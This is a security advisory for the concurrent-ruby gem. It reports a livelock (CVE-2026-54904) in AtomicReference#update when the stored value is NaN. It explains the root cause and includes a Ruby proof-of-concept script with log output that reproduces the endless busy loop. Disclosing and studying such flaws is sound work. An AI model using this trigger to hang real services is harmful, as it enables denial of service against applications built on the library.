# [H] Concurrent Ruby : `AtomicReference#update` livelocks when the stored value is `Float::NAN`

## Summary
Severity: High
Advisory: GHSA-h8w8-99g7-qmvj
CVE: CVE-2026-54904
CWE: CWE-835
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-h8w8-99g7-qmvj
Type: github-advisory

## Affected
- RubyGems: `concurrent-ruby` — affected >=0 <1.3.7

## Details
### Summary
`Concurrent::AtomicReference#update` can enter a permanent busy retry loop when the current value is `Float::NAN`.

The issue is caused by the interaction between:
- `AtomicReference#update`, which retries until `compare_and_set(old_value, new_value)` succeeds.
- Numeric `compare_and_set`, which checks `old == old_value` before attempting the underlying atomic swap.
- Ruby NaN semantics, where `Float::NAN == Float::NAN` is always `false`.

As a result, once an `AtomicReference` contains `Float::NAN`, calling `#update` repeatedly evaluates the caller's block and never returns. In services that store externally derived numeric values in an `AtomicReference`, this can cause CPU exhaustion or permanent request/job hangs.

### Version
Software: concurrent-ruby
Version: 1.3.6
Commit: 7a1b78941c081106c20a9ca0144ac73a48d254ab
### Details

`AtomicReference#update` retries until `compare_and_set` returns true:

```ruby
def update
  true until compare_and_set(old_value = get, new_value = yield(old_value))
  new_value
end
```

For numeric expected values, `compare_and_set` uses numeric equality before attempting the underlying atomic compare-and-set:

```ruby
def compare_and_set(old_value, new_value)
  if old_value.kind_of? Numeric
    while true
      old = get

      return false unless old.kind_of? Numeric
      return false unless old == old_value

      result = _compare_and_set(old, new_value)
      return result if result
    end
  else
    _compare_and_set(old_value, new_value)
  end
end
```

When the stored value is `Float::NAN`, `old_value = get` returns NaN. The later comparison `old == old_value` is false because NaN is not equal to itself. `compare_and_set` therefore returns false every time. `AtomicReference#update` treats that as a failed concurrent update and retries forever.

This is reachable through the public `Concurrent::AtomicReference` API and does not require native extensions or undefined behavior.

### PoC

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require 'concurrent/atomic/atomic_reference'
require 'concurrent/version'

puts "ruby=#{RUBY_DESCRIPTION}"
puts "concurrent_ruby_version=#{Concurrent::VERSION}"
puts "poc=AtomicReference#update livelock when current value is Float::NAN"

ref = Concurrent::AtomicReference.new(Float::NAN)
attempts = 0
finished = false

worker = Thread.new do
  ref.update do |_old_value|
    attempts += 1
    0.0
  end
  finished = true
end

sleep 0.25

puts "nan_update_attempts_after_250ms=#{attempts}"
puts "nan_update_finished=#{finished}"
puts "nan_update_worker_alive=#{worker.alive?}"

if worker.alive? && !finished && attempts > 1000
  puts 'result=REPRODUCED busy retry loop; update did not complete'
else
  puts 'result=NOT_REPRODUCED'
end

worker.kill
worker.join

control = Concurrent::AtomicReference.new(1.0)
control_attempts = 0
control_result = control.update do |old_value|
  control_attempts += 1
  old_value + 1.0
end

puts "control_update_result=#{control_result.inspect}"
puts "control_update_attempts=#{control_attempts}"
puts "control_update_final_value=#{control.value.inspect}"
```
### Log evidence
```text
ruby=ruby 2.6.10p210 (2022-04-12 revision 67958) [universal.arm64e-darwin25]
concurrent_ruby_version=1.3.6
poc=AtomicReference#update livelock when current value is Float::NAN
nan_update_attempts_after_250ms=1926016
nan_update_finished=false
nan_update_worker_alive=true
result=REPRODUCED busy retry loop; update did not complete
control_update_result=2.0
control_update_attempts=1
control_update_final_value=2.0
```

### Impact
This is an application-level denial of service issue. If an application stores externally derived numeric data in a `Concurrent::AtomicReference`, an attacker or faulty upstream data source may be able to cause the stored value to become `Float::NAN`. Any later call to `AtomicReference#update` on that reference will spin indefinitely, repeatedly executing the update block and consuming CPU.

### Credit
Pranjali Thakur - depthfirst ([depthfirst.com](<http://depthfirst.com>))

## References
- https://github.com/ruby-concurrency/concurrent-ruby/security/advisories/GHSA-h8w8-99g7-qmvj
- https://nvd.nist.gov/vuln/detail/CVE-2026-54904
- https://github.com/ruby-concurrency/concurrent-ruby/commit/6e37e0644b83b182971dc540d2e4bee38df61386
- https://github.com/ruby-concurrency/concurrent-ruby
- https://github.com/ruby-concurrency/concurrent-ruby/releases/tag/v1.3.7
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/concurrent-ruby/CVE-2026-54904.yml
- https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54904
